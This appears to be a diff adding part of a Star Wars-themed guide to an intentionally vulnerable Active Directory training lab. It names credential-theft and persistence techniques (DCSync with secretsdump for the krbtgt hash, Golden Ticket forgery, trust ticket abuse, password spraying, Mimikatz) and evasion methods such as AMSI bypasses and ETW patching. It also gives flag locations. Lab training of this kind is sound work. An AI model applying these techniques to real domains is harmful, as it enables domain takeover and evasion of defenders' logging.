+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
